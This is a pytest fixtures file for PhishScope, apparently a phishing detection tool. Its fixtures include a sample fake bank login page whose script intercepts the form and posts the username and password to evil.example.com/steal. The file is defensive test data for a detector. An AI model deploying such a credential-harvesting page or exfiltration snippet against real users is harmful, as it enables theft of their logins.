"""
Pytest configuration and shared fixtures for PhishScope tests
"""

import asyncio
import json
import logging
from pathlib import Path
from typing import Dict, Any
from unittest.mock import Mock, AsyncMock

import pytest
from playwright.async_api import async_playwright, Browser, Page


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_logger():
    """Provide a mock logger for testing"""
    logger = Mock(spec=logging.Logger)
    logger.info = Mock()
    logger.warning = Mock()
    logger.error = Mock()
    logger.debug = Mock()
    return logger


@pytest.fixture
def temp_output_dir(tmp_path):
    """Provide a temporary output directory for test artifacts"""
    output_dir = tmp_path / "test_output"
    output_dir.mkdir(exist_ok=True)
    return output_dir


@pytest.fixture
def sample_phishing_html():
    """Sample phishing page HTML for testing"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Login - Bank of Example</title>
    </head>
    <body>
        <h1>Bank of Example - Login</h1>
        <form id="loginForm" action="https://evil.example.com/steal" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                var formData = new FormData(this);
                fetch('https://evil.example.com/steal', {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    window.location.href = 'https://legitimate-bank.com';
                });
            });
        </script>
    </body>
    </html>
    """


@pytest.fixture
def sample_legitimate_html():
    """Sample legitimate page HTML for testing"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Example Company</title>
    </head>
    <body>
        <h1>Welcome to Example Company</h1>
        <p>This is a legitimate website.</p>
        <a href="/about">About Us</a>
    </body>
    </html>
    """


@pytest.fixture
def mock_page_context():
    """Mock Playwright Page object"""
    page = AsyncMock(spec=Page)
    page.url = "https://phishing.example.com"
    page.title = AsyncMock(return_value="Fake Login Page")
    page.content = AsyncMock(return_value="<html><body>Test</body></html>")
    page.screenshot = AsyncMock(return_value=b"fake_screenshot_data")
    page.evaluate = AsyncMock(return_value={})
    return page


@pytest.fixture
def sample_network_log():
    """Sample network traffic log for testing"""
    return [
        {
            "url": "https://phishing.example.com/",
            "method": "GET",
            "status": 200,
            "type": "document"
        },
        {
            "url": "https://evil.example.com/steal",
            "method": "POST",
            "status": 200,
            "type": "fetch",
            "postData": "username=victim&password=secret123"
        },
        {
            "url": "https://cdn.example.com/jquery.js",
            "method": "GET",
            "status": 200,
            "type": "script"
        }
    ]


@pytest.fixture
def sample_dom_findings():
    """Sample DOM inspection findings"""
    return {
        "forms_count": 1,
        "forms": [
            {
                "id": "loginForm",
                "action": "https://evil.example.com/steal",
                "method": "POST",
                "fields": [
                    {"name": "username", "type": "text"},
                    {"name": "password", "type": "password"}
                ],
                "suspicious": True,
                "reasons": ["Form submits to external domain"]
            }
        ],
        "suspicious_elements": [
            {
                "type": "form",
                "reason": "External form action",
                "details": "Form submits to evil.example.com"
            }
        ]
    }


@pytest.fixture
def sample_js_findings():
    """Sample JavaScript analysis findings"""
    return {
        "suspicious_patterns": [
            {
                "pattern": "credential_theft",
                "count": 1,
                "severity": "high",
                "description": "Form data intercepted and sent to external server",
                "code_snippet": "fetch('https://evil.example.com/steal', {method: 'POST', body: formData})",
                "matches": ["fetch('https://evil.example.com/steal', {method: 'POST', body: formData})"]
            }
        ],
        "obfuscation_detected": False,
        "external_scripts": ["https://cdn.example.com/jquery.js"],
        "inline_scripts_count": 1,
        "external_scripts_count": 1,
        "event_listeners": []
    }


@pytest.fixture
def sample_network_findings():
    """Sample network analysis findings"""
    return {
        "total_requests": 10,
        "post_requests": [
            {
                "url": "https://evil.example.com/steal",
                "method": "POST",
                "domain": "evil.example.com"
            }
        ],
        "exfiltration_candidates": [
            {
                "url": "https://evil.example.com/steal",
                "domain": "evil.example.com",
                "path": "/steal",
                "method": "POST",
                "suspicious_score": 3,
                "reasons": ["Suspicious endpoint path", "Data-related URL parameters"],
                "resource_type": "fetch"
            }
        ],
        "third_party_domains": [
            {
                "domain": "cdn.example.com",
                "request_count": 2,
                "methods": ["GET"],
                "resource_types": ["script"]
            }
        ],
        "suspicious_endpoints": [],
        "evidence": []
    }


@pytest.fixture
def sample_analysis_results(sample_dom_findings, sample_js_findings, sample_network_findings):
    """Complete sample analysis results"""
    return {
        "url": "https://phishing.example.com",
        "timestamp": "2026-02-02T12:00:00.000Z",
        "page_load": {
            "success": True,
            "title": "Fake Login Page",
            "screenshot_path": "screenshot.png"
        },
        "findings": {
            "dom": sample_dom_findings,
            "javascript": sample_js_findings,
            "network": sample_network_findings
        }
    }


@pytest.fixture
async def browser_context():
    """Provide a real Playwright browser context for integration tests"""
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        yield context
        await context.close()
        await browser.close()


@pytest.fixture
def mock_llm_response():
    """Mock LLM analysis response"""
    return {
        "is_phishing": True,
        "confidence": 0.95,
        "reasoning": "The page contains a login form that submits credentials to an external domain (evil.example.com), which is a clear indicator of credential theft.",
        "attack_type": "Credential Harvesting",
        "severity": "Critical",
        "recommendations": [
            "Block access to evil.example.com",
            "Alert users who may have submitted credentials",
            "Report domain to threat intelligence feeds"
        ]
    }


@pytest.fixture
def create_test_html_file(tmp_path):
    """Factory fixture to create test HTML files"""
    def _create_file(filename: str, content: str) -> Path:
        file_path = tmp_path / filename
        file_path.write_text(content)
        return file_path
    return _create_file


# Markers for test categorization
def pytest_configure(config):
    """Register custom markers"""
    config.addinivalue_line("markers", "unit: Unit tests for individual components")
    config.addinivalue_line("markers", "integration: Integration tests for full pipeline")
    config.addinivalue_line("markers", "slow: Tests that take significant time to run")
    config.addinivalue_line("markers", "requires_browser: Tests that require Playwright browser")
    config.addinivalue_line("markers", "requires_ai: Tests that require LLM configuration")